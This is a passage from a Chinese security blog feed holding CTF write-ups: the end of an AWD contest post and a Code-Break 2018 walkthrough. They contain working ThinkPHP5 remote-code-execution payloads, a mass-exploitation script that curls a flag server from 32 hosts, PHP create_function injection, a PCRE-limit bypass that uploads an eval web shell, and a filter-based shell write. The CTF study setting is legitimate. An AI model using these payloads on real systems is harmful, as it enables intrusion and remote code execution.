url</span><br><span class="line">    print res.text</span><br><span class="line">  except:</span><br><span class="line">   pass</span><br></pre></td></tr></table></figure><p>拉下来源码后迅速审计 <code>cve</code> ，发现是一个 <code>thinkphp5.*</code> 的任意代码执行漏洞</p><p>附上几个 <code>poc</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com</span><br><span class="line">？s=index/\think\Request/input&amp;filter=system&amp;data=echo%20www_admintony_com</span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20echo%20www_admintony_com;?%3E</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com</span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20echo%20\&quot;www_admintony_com\&quot;;?%3E</span><br></pre></td></tr></table></figure><p>发现第四个 <code>payload</code> 返回如下</p><p><img src="4.png" alt></p><p>这里 <code>payload</code> 释义解释一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">index/\think\Container/invokefunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1</span><br><span class="line"></span><br><span class="line">index是对应的模块，处于application文件夹中</span><br><span class="line"></span><br><span class="line">\think\Container 以反斜线开头，这就是我们想要实例化的类</span><br><span class="line"></span><br><span class="line">invokefunction是想\think\Container类想要调用的方法，</span><br><span class="line"></span><br><span class="line">function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1是对应invokefunction的参数。</span><br></pre></td></tr></table></figure><p>那么我们查看 <code>application</code> 目录下模块</p><p><img src="5.png" alt></p><p>可以看到这里有 <code>admin</code> , <code>api</code> , <code>behavior</code> , <code>shop</code> , <code>wap</code> 五个模块</p><p>没有之前收集 <code>payload</code> 中的 <code>index</code> 模块，更改模块名为以上任意一个后执行成功。</p><p><img src="6.png" alt></p><p>然后写通打脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">payload = &quot;api/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=curl http://192.168.100.1/Getkey&quot;</span><br><span class="line">ips = []</span><br><span class="line">ip = &apos;&apos;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">  ip = &apos;http://4.4.%d.100/?s=&apos;%i</span><br><span class="line">  ips.append(ip)</span><br><span class="line">for url in ips:</span><br><span class="line">  print requests.get(url+payload).content</span><br></pre></td></tr></table></figure><p>利用这个洞苟到了最后，也可以写个假流量进行混打，干扰别人抓流量的速度。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>awd线下手速一定要练好，备份源码和数据库，更改后台密码，删除后门。然后在这个基础上做好正常的防御流程，上 <code>waf</code> 和 <code>log</code> 监控。再进行源码审计，对比本地搜集的 <code>cve</code> 和源码，尽快复现。</p><p>参考链接</p><p><a href="https://www.secpulse.com/archives/92835.html" target="_blank" rel="noopener">ThinkPHP5 远程命令执行漏洞分析</a></p><p><a href="https://www.jianshu.com/p/46ceb2c338bc" target="_blank" rel="noopener">ThinkPHP 5.0 &amp; 5.1远程命令执行漏洞利用分析</a></p><p><a href="https://xz.aliyun.com/t/2828" target="_blank" rel="noopener">DuomiCMS3.0最新版漏洞挖掘</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;这次比赛有两道web，部署在同一台机子中，网站根目录分别存储有 &lt;code&gt;web1&lt;/code&gt; , &lt;code&gt;web2&lt;/code&gt; 两个网站源码，外部端口分别对应 &lt;code&gt;80&lt;/code&gt; , &lt;code&gt;81&lt;/code&gt; 两个端口。获取 &lt;code&gt;flag&lt;/code&gt; 的方式为 &lt;code&gt;curl http://192.168.100.1/Getkey&lt;/code&gt; 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>notes</title>
    <link href="https://zo1ro.github.io/2019/01/10/notes/"/>
    <id>https://zo1ro.github.io/2019/01/10/notes/</id>
    <published>2019-01-09T16:43:37.000Z</published>
    <updated>2019-05-11T15:27:47.105Z</updated>
    
    <content type="html"><![CDATA[<p>日常笔记–notes<br><a id="more"></a></p><p>十六进制&amp;ascii查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -Cv filename</span><br></pre></td></tr></table></figure><p>window杀进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr 3306</span><br><span class="line">tasklist | findstr 3306</span><br><span class="line">taskkill  /F /PID pid</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;日常笔记–notes&lt;br&gt;
    
    </summary>
    
    
      <category term="md" scheme="https://zo1ro.github.io/tags/md/"/>
    
  </entry>
  
  <entry>
    <title>Code-Break-2018</title>
    <link href="https://zo1ro.github.io/2018/12/30/code-break/"/>
    <id>https://zo1ro.github.io/2018/12/30/code-break/</id>
    <published>2018-12-30T12:16:02.000Z</published>
    <updated>2019-05-09T16:24:56.966Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>年底了，来一发 <code>Code-Break</code> 入入魂。给无滋无味的预习增添一些色彩</p><p>膜了几位师傅的思路  let‘s go~！</p> <a id="more"></a><h2 id="0x1-easy-function"><a href="#0x1-easy-function" class="headerlink" title="0x1 easy_function"></a>0x1 easy_function</h2><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题的思路在于不影响函数调用的情况下绕过正则，fuzz出 <code>%5c</code> 在字符前仍能进行调用，通过<code>$arg</code> 传入 <code>payload</code> </p><p><img src="4.png" alt="4"></p><p>参考</p><p><a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function()代码注入</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//?id=2;&#125;phpinfo();/*</span></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$str2=<span class="string">'echo  '</span>.$a.<span class="string">'test'</span>.$id.<span class="string">";"</span>;</span><br><span class="line">$f1 = create_function(<span class="string">'$a'</span>,$str2);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">payload</span></span><br><span class="line"><span class="comment">id=2;&#125;phpinfo();//</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">源代码：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"test"</span>.$a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注入后代码：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"test"</span>;&#125;</span><br><span class="line">  phpinfo();<span class="comment">//;//此处为注入代码。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=\create_function&amp;arg=1;&#125;print_r(scandir(%22/var/www/%22));//</span><br></pre></td></tr></table></figure><p>查看flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=\create_function&amp;arg=1;&#125;print_r(file(&quot;/var/www/flag_h0w2execute_arb1trary_c0de&quot;));//</span><br></pre></td></tr></table></figure><h2 id="0x2-easy-pcrewaf"><a href="#0x2-easy-pcrewaf" class="headerlink" title="0x2 easy_pcrewaf"></a>0x2 easy_pcrewaf</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125; <span class="number">1</span></span><br></pre></td></tr></table></figure><p>可以看到是一个上传文件</p><p>创建 <code>html</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://51.158.75.42:8088/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>参考</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p><a href="http://www.laruence.com/2010/06/08/1579.html" target="_blank" rel="noopener">深悉正则(pcre)最大回溯/递归限制</a></p><p>php的 <code>preg_match</code>  设定了 <code>pcre.backtrack_limit</code> 。默认值大小为 <code>1000000</code></p><p>超过这个值 <code>preg_match</code> 将返回 <code>false</code> 从而绕过正则匹配。</p><p><img src="2.png" alt></p><p><img src="1.png" alt></p><p>生成payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//<span class="number">1.</span>py</span><br><span class="line">a=<span class="string">'&lt;?php @eval($_GET["cmd"]);//'</span>+<span class="string">"a"</span>*<span class="number">1000000</span></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line">//python <span class="number">1.</span>py &gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure><p>上传拿 <code>shell</code></p><p>（这里似乎后端设置了不可执行<code>system</code>，故上传<code>eval</code>）</p><p><img src="3.png" alt></p><h2 id="0x3-easy-phpmagic"><a href="#0x3-easy-phpmagic" class="headerlink" title="0x3 easy-phpmagic"></a>0x3 easy-phpmagic</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//section1</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//section2</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line">            <span class="keyword">endif</span>; <span class="meta">?&gt;</span>&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>这题思路是通过 <code>domain</code> 参数进行写shell，然后通过 <code>log_name</code> 参数列路径读取shell，而 <code>log_name</code> 是由  <code>$_SERVER[&#39;SERVER_NAME&#39;]</code> 和<code>$log_name</code>组成，可以知道前者就是 <code>host</code> ，后者则是我们传入的 <code>log</code> 参数   。</p><p>其中，<code>domain</code> 经过 <code>escapeshellarg</code> 后无法进行命令注入。</p><p>读取时经过 <code>htmlspecialchars</code> 将文件内容转换为html实体，无法进行直接编译。并且还有 <code>pathinfo</code> 后缀过滤。</p><p>参考</p><p><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p><p>通过后缀 <code>/.</code> 绕过 <code>pathinfo</code> 函数。</p><p>写shell就通过伪协议编码写入。</p><p>还有一个trick：就是php在进行base64解码的时候如果遇到不是base64编码的字符会直接跳过。</p><p>最终构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: php</span><br><span class="line"></span><br><span class="line">domain=PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg&amp;log=://filter/write=convert.base64-decode/resource=shell.php/.</span><br></pre></td></tr></table></figure><p>然后通过路径读取访问我们的shell</p><p><img src="8.png" alt></p><h2 id="0x4-easy-phplimit"><a href="#0x4-easy-phplimit" class="headerlink" title="0x4 easy-phplimit"></a>0x4 easy-phplimit</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题和<code>RCTF 2018</code>的<code>r-cursive</code> 类似</p><p>参考</p><p><a href="https://xz.aliyun.com/t/2347#toc-2" target="_blank" rel="noopener"><strong>r-cursive</strong></a></p><p>环境由 <code>apache</code>变为<code>nginx</code></p><p>故原题的payload <code>getallheaders()</code>无法使用，改为 <code>get_defined_vars()</code></p><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=var_dump(get_defined_vars()); HTTP/1.1</span><br><span class="line"></span><br><span class="line">array(4) &#123;</span><br><span class="line">  ["_GET"]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    ["code"]=&gt;</span><br><span class="line">    string(29) "var_dump(get_defined_vars());"</span><br><span class="line">  &#125;</span><br><span class="line">  ["_POST"]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  ["_COOKIE"]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  ["_FILES"]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=var_dump(next(current(get_defined_vars())));&amp;1=print_r(scandir("/var/www/")); HTTP/1.1</span><br><span class="line"></span><br><span class="line">string(30) "print_r(scandir("/var/www/"));"</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(next(current(get_defined_vars())));&amp;1=print_r(scandir("/var/www/")); HTTP/1.1</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; flag_phpbyp4ss</span><br><span class="line">    [3] =&gt; html</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(next(current(get_defined_vars())));&amp;1=print_r(file(&quot;/var/www/flag_phpbyp4ss&quot;)); HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="6.png" alt></p><h2 id="0x5-easy-nodechr"><a href="#0x5-easy-nodechr" class="headerlink" title="0x5 easy-nodechr"></a>0x5 easy-nodechr</h2><p>源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">// initial libraries</span><br><span class="line">const Koa = require('koa')</span><br><span class="line">const sqlite = require('sqlite')</span><br><span class="line">const fs = require('fs')</span><br><span class="line">const views = require('koa-views')</span><br><span class="line">const Router = require('koa-router')</span><br><span class="line">const send = require('koa-send')</span><br><span class="line">const bodyParser = require('koa-bodyparser')</span><br><span class="line">const session = require('koa-session')</span><br><span class="line">const isString = require('underscore').isString</span><br><span class="line">const basename = require('path').basename</span><br><span class="line"></span><br><span class="line">const config = JSON.parse(fs.readFileSync('../config.json', &#123;encoding: 'utf-8', flag: 'r'&#125;))</span><br><span class="line"></span><br><span class="line">async function main() &#123;</span><br><span class="line">    const app = new Koa()</span><br><span class="line">    const router = new Router()</span><br><span class="line">    const db = await sqlite.open(':memory:')</span><br><span class="line"></span><br><span class="line">    await db.exec(`CREATE TABLE "main"."users" (</span><br><span class="line">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">        "username" TEXT NOT NULL,</span><br><span class="line">        "password" TEXT,</span><br><span class="line">        CONSTRAINT "unique_username" UNIQUE ("username")</span><br><span class="line">    )`)</span><br><span class="line">    await db.exec(`CREATE TABLE "main"."flags" (</span><br><span class="line">        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">        "flag" TEXT NOT NULL</span><br><span class="line">    )`)</span><br><span class="line">    for (let user of config.users) &#123;</span><br><span class="line">        await db.run(`INSERT INTO "users"("username", "password") VALUES ('$&#123;user.username&#125;', '$&#123;user.password&#125;')`)</span><br><span class="line">    &#125;</span><br><span class="line">    await db.run(`INSERT INTO "flags"("flag") VALUES ('$&#123;config.flag&#125;')`)</span><br><span class="line"></span><br><span class="line">    router.all('login', '/login/', login).get('admin', '/', admin).get('static', '/static/:path(.+)', static).get('/source', source)</span><br><span class="line"></span><br><span class="line">    app.use(views(__dirname + '/views', &#123;</span><br><span class="line">        map: &#123;</span><br><span class="line">            html: 'underscore'</span><br><span class="line">        &#125;,</span><br><span class="line">        extension: 'html'</span><br><span class="line">    &#125;)).use(bodyParser()).use(session(app))</span><br><span class="line">    </span><br><span class="line">    app.use(router.routes()).use(router.allowedMethods());</span><br><span class="line">    </span><br><span class="line">    app.keys = config.signed</span><br><span class="line">    app.context.db = db</span><br><span class="line">    app.context.router = router</span><br><span class="line">    app.listen(3000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">    if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123;</span><br><span class="line">        return keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function login(ctx, next) &#123;</span><br><span class="line">    if(ctx.method == 'POST') &#123;</span><br><span class="line">        let username = safeKeyword(ctx.request.body['username'])</span><br><span class="line">        let password = safeKeyword(ctx.request.body['password'])</span><br><span class="line"></span><br><span class="line">        let jump = ctx.router.url('login')</span><br><span class="line">        if (username &amp;&amp; password) &#123;</span><br><span class="line">            let user = await ctx.db.get(`SELECT * FROM "users" WHERE "username" = '$&#123;username.toUpperCase()&#125;' AND "password" = '$&#123;password.toUpperCase()&#125;'`)</span><br><span class="line"></span><br><span class="line">            if (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url('admin')</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = 303</span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        await ctx.render('index')</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function 